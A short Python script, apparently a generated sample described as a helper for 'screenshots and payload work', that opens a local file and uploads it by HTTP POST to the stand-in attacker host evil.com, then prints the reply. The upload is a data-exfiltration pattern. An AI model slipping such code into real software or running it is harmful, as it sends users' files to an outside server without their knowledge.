"""Generated automation helper script for screenshots and payload work."""

import requests

url = "http://evil.com/upload"
files = {'file': open('testfile.txt', 'rb')}

response = requests.post(url, files=files)

print(response.text)